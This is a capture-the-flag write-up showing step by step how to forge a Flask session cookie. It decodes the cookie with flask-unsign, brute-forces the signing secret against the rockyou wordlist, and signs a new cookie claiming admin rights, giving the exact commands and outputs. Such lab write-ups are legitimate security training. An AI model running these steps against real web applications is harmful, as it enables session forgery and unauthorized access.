# Most Cookies

1. Inspect the website cookies.
![image](https://github.com/user-attachments/assets/ee3aa372-94d3-443b-927b-340e487e5d20)


This is a flask cookie.

2. Inorder to crack it you can use **flask-unsign** tool.

```python
pip3 install flask-unsign
```

3. decode the cookie to determine the value.
```bash
flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z3QHLA.nVmLIBceO6cKuwt1DqyDYTcjdkE'
```

<font color="red">{'very_auth': 'snickerdoodle'}</font>

4. Crack the **secret** so you can make your own cookie.
    - make a cookie.txt and store the encoded cookie value.
```bash
flask-unsign --unsign --cookie < cookie.txt --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
```

<font color="red">b'fortune'</font>

5. After getting the secret value sign a new cookie.

flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune'
<font color="red">eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z3QCYQ.xJV691iZUqOyCimwkii-9g4pxQA</font>

6. Change the cookie vlaue on the website and you get the flag.
![image](https://github.com/user-attachments/assets/4d21f4e7-adfe-439f-9158-dbd9f111f9fb)

